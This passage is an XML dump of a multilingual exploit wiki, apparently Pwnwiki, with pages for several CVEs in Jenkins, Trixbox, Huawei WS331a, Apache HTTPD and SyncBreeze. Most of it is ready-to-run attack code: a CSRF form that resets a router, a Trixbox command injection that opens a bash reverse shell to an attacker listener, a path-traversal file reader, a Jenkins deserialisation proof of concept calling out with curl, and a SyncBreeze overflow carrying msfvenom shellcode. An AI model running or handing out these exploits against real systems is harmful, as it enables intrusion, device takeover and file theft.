handler = socketserver.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)

print("Ready? Is your FTP server running?")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((FTP_HOST, FTP_PORT))
if result == 0:
   print("FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT))
else:
   print("FTP is down :( Exiting.")
   exit(1)

print("Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT)

handler.serve_forever()
            
&lt;/pre&gt;</text>
      <sha1>88jw5byqamroincai4whhmfyepgcw5e</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-6158 華為WS331a產品管理頁面CSRF漏洞</title>
    <ns>0</ns>
    <id>1351</id>
    <revision>
      <id>1691</id>
      <timestamp>2021-04-15T11:15:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== 當管理員登陸後，打開如下poc頁面，WS331a設備將重啟。 &lt;pre&gt; &lt;form action="http://192.168.3.1/api/service/reboot.cgi" method="post"&gt; &lt;/form&gt; &lt;script&gt;..."</comment>
      <origin>1691</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="563" sha1="rthtwl68024kpqj3kccgt2ob4h1yi76" xml:space="preserve">==POC==
當管理員登陸後，打開如下poc頁面，WS331a設備將重啟。
&lt;pre&gt;
&lt;form action="http://192.168.3.1/api/service/reboot.cgi" method="post"&gt;
&lt;/form&gt;
&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;
&lt;/pre&gt;

當管理員登陸後，打開如下poc頁面，WS331a設備將恢復初始化配置。設備自動重啟後不需要密碼即可連接熱點，並使用amdin/admin對設備進行管理控制。
&lt;pre&gt;
&lt;form action="http://192.168.3.1/api/service/restoredefcfg.cgi" method="post"&gt;
&lt;/form&gt;
&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;
&lt;/pre&gt;</text>
      <sha1>rthtwl68024kpqj3kccgt2ob4h1yi76</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-9299 代碼執行漏洞</title>
    <ns>0</ns>
    <id>156</id>
    <revision>
      <id>253</id>
      <timestamp>2021-03-09T07:54:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==簡介== 2.32之前的Jenkins和2.19.3之前的LTS中的遠程處理模塊允許遠程攻擊者通過精心製作的序列化Java對象執行任意代碼，從而觸發對..."</comment>
      <origin>253</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="273" sha1="1mkjbvok18gpbuh88kcc164f5odfhg1" xml:space="preserve">==簡介==
2.32之前的Jenkins和2.19.3之前的LTS中的遠程處理模塊允許遠程攻擊者通過精心製作的序列化Java對象執行任意代碼，從而觸發對第三方服務器的LDAP查詢。

==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>1mkjbvok18gpbuh88kcc164f5odfhg1</sha1>
    </revision>
    <revision>
      <id>254</id>
      <parentid>253</parentid>
      <timestamp>2021-03-09T07:55:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>254</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="313" sha1="6dkrbxq5yscrlcm8t0e2hcklm2q3ea3" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==簡介==
2.32之前的Jenkins和2.19.3之前的LTS中的遠程處理模塊允許遠程攻擊者通過精心製作的序列化Java對象執行任意代碼，從而觸發對第三方服務器的LDAP查詢。
&lt;/translate&gt;
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>6dkrbxq5yscrlcm8t0e2hcklm2q3ea3</sha1>
    </revision>
    <revision>
      <id>257</id>
      <parentid>254</parentid>
      <timestamp>2021-03-09T07:55:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>257</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="324" sha1="78dx72sjs7xkhor98fbr90qb39uunww" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==簡介== &lt;!--T:1--&gt;
2.32之前的Jenkins和2.19.3之前的LTS中的遠程處理模塊允許遠程攻擊者通過精心製作的序列化Java對象執行任意代碼，從而觸發對第三方服務器的LDAP查詢。
&lt;/translate&gt;
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>78dx72sjs7xkhor98fbr90qb39uunww</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-9299 代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>3915</id>
    <revision>
      <id>4532</id>
      <timestamp>2021-06-10T02:43:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Introduction== The remote processing module in Jenkins before 2.32 and LTS before 2.19.3 allows remote attackers to execute arbitrary code through elaborate serialization of..."</comment>
      <origin>4532</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="326" sha1="elmd9b60iub72wsbsdho3nl70b6lqgk" xml:space="preserve">&lt;languages  /&gt;

==Introduction==
The remote processing module in Jenkins before 2.32 and LTS before 2.19.3 allows remote attackers to execute arbitrary code through elaborate serialization of Java objects, thereby triggering LDAP queries to third-party servers.
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>elmd9b60iub72wsbsdho3nl70b6lqgk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-9299 代碼執行漏洞/id</title>
    <ns>0</ns>
    <id>2913</id>
    <revision>
      <id>3414</id>
      <timestamp>2021-05-26T13:24:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Pendahuluan == Modul pemrosesan jarak jauh di Jenkins sebelum 2.32 dan LTS sebelum 2.19.3 memungkinkan penyerang jarak jauh untuk mengeksekusi kode arbitrer melalui seriali..."</comment>
      <origin>3414</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="334" sha1="ohzmf9q7cvmk1w5rz50zkoyt0ta203b" xml:space="preserve">&lt;languages  /&gt;

== Pendahuluan ==
Modul pemrosesan jarak jauh di Jenkins sebelum 2.32 dan LTS sebelum 2.19.3 memungkinkan penyerang jarak jauh untuk mengeksekusi kode arbitrer melalui serialisasi objek Java yang rumit, sehingga memicu kueri LDAP ke server pihak ketiga.
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>ohzmf9q7cvmk1w5rz50zkoyt0ta203b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-9299 代碼執行漏洞/yue</title>
    <ns>0</ns>
    <id>4240</id>
    <revision>
      <id>4876</id>
      <timestamp>2021-06-12T09:38:57Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==簡介== 2.32之前嘅Jenkins同2.19.3之前嘅LTS中嘅遠程處理模塊允許遠程攻擊者通過精心製作嘅序列化Java對象執行任意代碼，從而觸發對..."</comment>
      <origin>4876</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="288" sha1="calf68hulvjhzrlqdibpw5swkh4gi70" xml:space="preserve">&lt;languages  /&gt;

==簡介==
2.32之前嘅Jenkins同2.19.3之前嘅LTS中嘅遠程處理模塊允許遠程攻擊者通過精心製作嘅序列化Java對象執行任意代碼，從而觸發對第三方服務器嘅LDAP查詢。
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>calf68hulvjhzrlqdibpw5swkh4gi70</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-9299 代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5109</id>
    <revision>
      <id>5849</id>
      <timestamp>2021-06-24T03:06:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2016-9299 代码执行漏洞"</comment>
      <origin>5849</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="288" sha1="16lgz2hnyww3k55hcsun1s4jxa2wlvz" xml:space="preserve">&lt;languages  /&gt;

==简介==
2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>16lgz2hnyww3k55hcsun1s4jxa2wlvz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2016-9299 代碼執行漏洞/zh-hans</title>
    <ns>0</ns>
    <id>4237</id>
    <revision>
      <id>4873</id>
      <timestamp>2021-06-12T09:37:25Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "CVE-2016-9299 代码执行漏洞"</comment>
      <origin>4873</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="349" sha1="0pbsqxu5ohfzrg5ancztg9shs8bpw4p" xml:space="preserve">&lt;languages  /&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==簡介==
2.32之前的Jenkins和2.19.3之前的LTS中的遠程處理模塊允許遠程攻擊者通過精心製作的序列化Java對象執行任意代碼，從而觸發對第三方服務器的LDAP查詢。
&lt;/div&gt;
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>0pbsqxu5ohfzrg5ancztg9shs8bpw4p</sha1>
    </revision>
    <revision>
      <id>4890</id>
      <parentid>4873</parentid>
      <timestamp>2021-06-12T09:51:36Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==简介== 2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对..."</comment>
      <origin>4890</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="288" sha1="16lgz2hnyww3k55hcsun1s4jxa2wlvz" xml:space="preserve">&lt;languages  /&gt;

==简介==
2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。
==MSF==
&lt;pre&gt;
exploit/linux/misc/jenkins_ldap_deserialize
&lt;/pre&gt;</text>
      <sha1>16lgz2hnyww3k55hcsun1s4jxa2wlvz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-1000353 Jenkins-CI 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>159</id>
    <revision>
      <id>258</id>
      <timestamp>2021-03-09T07:57:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Jenkins&lt;=2.56 Jenkins LTS &lt;= 2.46.1 &lt;/pre&gt;  ==POC== https://github.com/vulhub/CVE-2017-1000353  &lt;pre&gt; java  -jar..."</comment>
      <origin>258</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="328" sha1="gsb64p1mleyylbjb31g7qarimll6bfc" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Jenkins&lt;=2.56
Jenkins LTS &lt;= 2.46.1
&lt;/pre&gt;

==POC==
https://github.com/vulhub/CVE-2017-1000353

&lt;pre&gt;
java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  "curl http://xxx.ceye.io"
&lt;/pre&gt;

&lt;pre&gt;
python exploit.py http://x.x.x.x:8080 jenkins_poc.ser
&lt;/pre&gt;</text>
      <sha1>gsb64p1mleyylbjb31g7qarimll6bfc</sha1>
    </revision>
    <revision>
      <id>259</id>
      <parentid>258</parentid>
      <timestamp>2021-03-09T07:57:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>259</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="339" sha1="o81q1twe2dy99ov3856m0lnwf1bi66t" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Jenkins&lt;=2.56
Jenkins LTS &lt;= 2.46.1
&lt;/pre&gt;

==POC==
https://github.com/vulhub/CVE-2017-1000353

&lt;pre&gt;
java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  "curl http://xxx.ceye.io"
&lt;/pre&gt;

&lt;pre&gt;
python exploit.py http://x.x.x.x:8080 jenkins_poc.ser
&lt;/pre&gt;</text>
      <sha1>o81q1twe2dy99ov3856m0lnwf1bi66t</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-1000353 Jenkins-CI 遠程代碼執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3078</id>
    <revision>
      <id>3579</id>
      <timestamp>2021-05-26T14:18:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本=="</comment>
      <origin>3579</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="303" sha1="3ue6eizw2c9fbh3hpf5vzp558sxflwj" xml:space="preserve">&lt;languages /&gt;
==影響版本==
&lt;pre&gt;
Jenkins&lt;=2.56
Jenkins LTS &lt;= 2.46.1
&lt;/pre&gt;

==POC==
https://github.com/vulhub/CVE-2017-1000353

&lt;pre&gt;
java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  "curl http://xxx.ceye.io"
&lt;/pre&gt;

&lt;pre&gt;
python exploit.py http://x.x.x.x:8080 jenkins_poc.ser
&lt;/pre&gt;</text>
      <sha1>3ue6eizw2c9fbh3hpf5vzp558sxflwj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-14535 Trixbox 2.8.0.4 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3102</id>
    <revision>
      <id>3602</id>
      <timestamp>2021-05-28T09:48:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Trixbox 2.8.0.4 - 'lang' Remote Code Execution (Unauthenticated) # Date: 27.05.2021 # Exploit Author: Ron Jost (Hacker5preme) # Credits to: http..."</comment>
      <origin>3602</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2124" sha1="879jl4rc6pioaw5s1lt1ai39avc0anm" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Trixbox 2.8.0.4 - 'lang' Remote Code Execution (Unauthenticated)
# Date: 27.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Credits to: https://secur1tyadvisory.wordpress.com/2018/02/11/trixbox-os-command-injection-vulnerability-cve-2017-14535/
# Credits to: Sachin Wagh
# Vendor Homepage: https://sourceforge.net/projects/asteriskathome/
# Software Link: https://sourceforge.net/projects/asteriskathome/files/trixbox%20CE/trixbox%202.8/trixbox-2.8.0.4.iso/download
# Version: 2.8.0.4
# Tested on: Xubuntu 20.04
# CVE: CVE-2017-14535

'''
Description:
trixbox 2.8.0.4 has OS command injection via shell metacharacters in the lang parameter to /maint/modules/home/index.php
'''



'''
Import required modules:
'''
import requests
import sys
import time


'''
User-input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]
listen_ip = sys.argv[3]
listen_port = sys.argv[4]


'''
Construct malicious request:
'''
# Construct header:
header = {
    'Host': target_ip,
    'User-Agent': 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Authorization': 'Basic bWFpbnQ6cGFzc3dvcmQ=',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0'
}

# Construct malicious link:
link_p1 = 'http://' + target_ip + ':' + target_port + '/maint/modules/home/index.php?lang=english|bash%20-i%20%3E%26%20'
link_p2 = '%2Fdev%2Ftcp%2F' + listen_ip + '%2F' + listen_port + '%200%3E%261||x'
link = link_p1 + link_p2


'''
Finish: EXPLOIT!!!
'''
print('')
print('')
print('Please start the following command in a seperate terminal: nc -lnvp ' + listen_port)
print('')
time.sleep(2)
Ready = input("If you're done and want to start the exploit please input EXPLOIT: ")
if Ready == 'EXPLOIT':
    print('')
    print('Exploit sent, check your Netcat instance :)')
    x = requests.post(link, headers=header)
else:
    print('TRY AGAIN')
&lt;/pre&gt;</text>
      <sha1>879jl4rc6pioaw5s1lt1ai39avc0anm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-14537 Trixbox 2.8.0.4 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>3101</id>
    <revision>
      <id>3601</id>
      <timestamp>2021-05-28T09:47:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Trixbox 2.8.0.4 - 'lang' Path Traversal # Date: 27.05.2021 # Exploit Author: Ron Jost (Hacker5preme) # Credits to: https://secur1tyadvisory.word..."</comment>
      <origin>3601</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2433" sha1="iwba0an1iac6wbevi4ttop3qkusmo0y" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Trixbox 2.8.0.4 - 'lang' Path Traversal
# Date: 27.05.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Credits to: https://secur1tyadvisory.wordpress.com/2018/02/13/trixbox-multiple-path-traversal-vulnerabilities-cve-2017-14537/
# Credits to: Sachin Wagh
# Vendor Homepage: https://sourceforge.net/projects/asteriskathome/
# Software Link: https://sourceforge.net/projects/asteriskathome/files/trixbox%20CE/trixbox%202.8/trixbox-2.8.0.4.iso/download
# Version: 2.8.0.4
# Tested on: Xubuntu 20.04
# CVE: CVE-2017-14537

'''
Description:
trixbox 2.8.0.4 has path traversal via the xajaxargs array parameter to /maint/index.php?packages or the
lang parameter to /maint/modules/home/index.php.
'''


'''
Import required modules:
'''
import requests
import sys
import urllib.parse


'''
User-Input:
'''
target_ip = sys.argv[1]
target_port = sys.argv[2]


'''
Construct malicious request:
'''
# Constructing header:
header = {
    'Host': target_ip,
    'User-Agent': 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Cookie': 'template=classic; lng=en; lng=en',
    'Upgrade-Insecure-Requests': '1',
    'Authorization': 'Basic bWFpbnQ6cGFzc3dvcmQ=',
}

# Constructing malicious link (payload):
base_link = 'http://' + target_ip + ':' + target_port
base_link_addon_1 = '/maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..'
base_link_addon_3 = '%00english'
print('')
base_link_addon_2 = input('Input the filepath or input EXIT: ')



'''
EXPLOIT:
'''
while base_link_addon_2 != 'EXIT':
    base_link_addon_2_coded = urllib.parse.quote(base_link_addon_2, safe='')
    exploit_link = base_link + base_link_addon_1 + base_link_addon_2_coded + base_link_addon_3
    print('')
    exploit = requests.post(exploit_link, headers=header)
    print('Contents of ' + base_link_addon_2 + ':')
    for data in exploit.iter_lines():
        data = data.decode('utf-8')
        if data != '&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;':
            print(data)
        else:
            break
    print('')
    base_link_addon_2 = input('Input the filepath or input EXIT: ')
&lt;/pre&gt;</text>
      <sha1>iwba0an1iac6wbevi4ttop3qkusmo0y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-15715 Apache HTTPD 換行解析漏洞</title>
    <ns>0</ns>
    <id>1682</id>
    <revision>
      <id>2086</id>
      <timestamp>2021-05-04T02:32:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== 2.4.0~2.4.29都有可能存在該漏洞  ==漏洞利用== 上傳一個名為1.php的文件，被攔截：  [[File:Ap1.png | 600px]]  在1.php後面插入一..."</comment>
      <origin>2086</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="484" sha1="mekz5dyolgxgm0v7kyojgzosju8aybv" xml:space="preserve">==影響版本==
2.4.0~2.4.29都有可能存在該漏洞

==漏洞利用==
上傳一個名為1.php的文件，被攔截：

[[File:Ap1.png | 600px]]

在1.php後面插入一個&lt;code&gt;\x0A&lt;/code&gt;（注意，不能是&lt;code&gt;\x0D\x0A&lt;/code&gt;，只能是一個&lt;code&gt;\x0A&lt;/code&gt;），不再攔截：

[[File:Ap2.png | 600px]]

訪問剛才上傳的&lt;code&gt;/1.php%0a&lt;/code&gt;，發現能夠成功解析，但這個文件不是php後綴，說明目標存在解析漏洞：

[[File:Ap3.png | 600px]]</text>
      <sha1>mekz5dyolgxgm0v7kyojgzosju8aybv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-15950 SyncBreeze 10.1.16 緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>3113</id>
    <revision>
      <id>3616</id>
      <timestamp>2021-05-30T02:25:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: SyncBreeze 10.1.16 - XML Parsing Stack-based Buffer Overflow # Date: 03/27/2021 # Author: Filipe Oliveira - filipecenturiao[at]hotmail.com Rafae..."</comment>
      <origin>3616</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4796" sha1="55juiufspwm1ms25yesjx0ub6ydvdim" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: SyncBreeze 10.1.16 - XML Parsing Stack-based Buffer Overflow
# Date: 03/27/2021
# Author: Filipe Oliveira - filipecenturiao[at]hotmail.com Rafael Machado  - nnszs[at]protonmail.com
# Vendor: https://www.syncbreeze.com/
# Software Link: https://www.4shared.com/file/57pE4sZfiq/syncbreeze_setup_v10116.html
# Version: SyncBreeze v10.1.16 x86
# Tested on: Windows 10 x64 (19042.867)
# CVE: CVE-2017-15950

Usage: The exploit will generate a POC file, called xplSyncBreeze.xml. Launch the application and click on Import Command, then load the POC file. 

# -*- coding: utf-8 -*-
    
import struct

# badchars
#\x00\x0a\x0d\x20\x27
#\x81\x82\x83\x84\x85\x86\x87\x88
#\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90
#\x91\x92\x93\x94\x95\x96\x97\x98
#\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0
#\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8
#\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0
#\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8
#\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0
#\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8
#\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0
#\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8
#\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0
#\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8
#\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0
#\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8
#\xF9\xFA\xFB\xFC\xFD\xFE\xFF

# Shellcode payload size: 432 bytes
# msfvenom -a x86 --platform windows -p windows/exec CMD=calc -e x86/alpha_mixed BufferRegister=EAX -b '\x00\x0A\x0D\x20\x27' -v shellcode -f python

shellcode =  b""
shellcode += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x69"
shellcode += b"\x78\x4e\x62\x75\x50\x77\x70\x35\x50\x45\x30"
shellcode += b"\x4b\x39\x59\x75\x55\x61\x39\x50\x52\x44\x4e"
shellcode += b"\x6b\x42\x70\x50\x30\x6e\x6b\x42\x72\x54\x4c"
shellcode += b"\x6c\x4b\x70\x52\x74\x54\x4c\x4b\x62\x52\x66"
shellcode += b"\x48\x44\x4f\x48\x37\x61\x5a\x51\x36\x45\x61"
shellcode += b"\x39\x6f\x6e\x4c\x75\x6c\x43\x51\x71\x6c\x65"
shellcode += b"\x52\x56\x4c\x47\x50\x4b\x71\x38\x4f\x74\x4d"
shellcode += b"\x37\x71\x49\x57\x38\x62\x7a\x52\x52\x72\x36"
shellcode += b"\x37\x4c\x4b\x63\x62\x42\x30\x6c\x4b\x31\x5a"
shellcode += b"\x57\x4c\x4c\x4b\x32\x6c\x36\x71\x31\x68\x4a"
shellcode += b"\x43\x47\x38\x47\x71\x4a\x71\x76\x31\x6c\x4b"
shellcode += b"\x36\x39\x67\x50\x66\x61\x58\x53\x4c\x4b\x70"
shellcode += b"\x49\x66\x78\x59\x73\x34\x7a\x53\x79\x6e\x6b"
shellcode += b"\x50\x34\x4c\x4b\x66\x61\x4e\x36\x55\x61\x39"
shellcode += b"\x6f\x4c\x6c\x4a\x61\x4a\x6f\x34\x4d\x67\x71"
shellcode += b"\x48\x47\x67\x48\x69\x70\x71\x65\x59\x66\x54"
shellcode += b"\x43\x63\x4d\x79\x68\x75\x6b\x73\x4d\x67\x54"
shellcode += b"\x44\x35\x79\x74\x72\x78\x4e\x6b\x53\x68\x71"
shellcode += b"\x34\x57\x71\x5a\x73\x52\x46\x6c\x4b\x36\x6c"
shellcode += b"\x72\x6b\x6c\x4b\x76\x38\x75\x4c\x67\x71\x68"
shellcode += b"\x53\x6e\x6b\x57\x74\x4e\x6b\x63\x31\x78\x50"
shellcode += b"\x6f\x79\x73\x74\x47\x54\x64\x64\x53\x6b\x31"
shellcode += b"\x4b\x63\x51\x50\x59\x63\x6a\x43\x61\x39\x6f"
shellcode += b"\x59\x70\x73\x6f\x31\x4f\x62\x7a\x4e\x6b\x44"
shellcode += b"\x52\x6a\x4b\x4e\x6d\x53\x6d\x73\x5a\x63\x31"
shellcode += b"\x4c\x4d\x4d\x55\x6f\x42\x75\x50\x47\x70\x33"
shellcode += b"\x30\x46\x30\x50\x68\x74\x71\x6c\x4b\x42\x4f"
shellcode += b"\x6e\x67\x39\x6f\x6e\x35\x6f\x4b\x58\x70\x78"
shellcode += b"\x35\x79\x32\x46\x36\x33\x58\x79\x36\x4c\x55"
shellcode += b"\x4f\x4d\x6d\x4d\x39\x6f\x6a\x75\x55\x6c\x63"
shellcode += b"\x36\x61\x6c\x45\x5a\x6d\x50\x49\x6b\x39\x70"
shellcode += b"\x32\x55\x75\x55\x6d\x6b\x57\x37\x64\x53\x74"
shellcode += b"\x32\x52\x4f\x50\x6a\x53\x30\x61\x43\x59\x6f"
shellcode += b"\x78\x55\x73\x53\x30\x61\x30\x6c\x72\x43\x43"
shellcode += b"\x30\x41\x41"


# padding to crash buffer
basura = struct.pack('&lt;L', 0x41414141) * 390

# gadgets to move payload pointer into EAX
GAD1 = struct.pack('&lt;L', 0x65235465) # XCHG EAX,EBP
GAD2 = struct.pack('&lt;L', 0x6506537C) # CALL EAX

# padding to reach buffer address stored in ebp
basura2 = struct.pack('&lt;L', 0x41414141) * 56

# padding for stack pivot

padding = struct.pack('&lt;L', 0x41414141) * 4
padding2 = struct.pack('&lt;L', 0x41414141) * 20

# stack pivot to reach an area with more space for gadgets on the stack
# 0x6506491c: add esp, 0x48 ; pop edi ; pop esi ; ret

pivot = struct.pack('&lt;L', 0x6506491c)

# final payload

fruta = basura + pivot + padding + padding2 + GAD1 + GAD2 + basura2 + shellcode


# write payload to xml file

payload = open("xplSyncBreeze.xml", "wb")
payload.write("&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n\n".encode('utf-8'))

payload.write("&lt;sync name='".encode('utf-8'))
payload.write(fruta)
payload.write("'&gt;\n&lt;/sync&gt;\n".encode('utf-8'))

payload.close()
&lt;/pre&gt;</text>
      <sha1>55juiufspwm1ms25yesjx0ub6ydvdim</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2017-5941 Node.JS - 'node-serialize' 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1207</id>
    <revision>
      <id>1512</id>
      <timestamp>2021-04-11T01:26:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
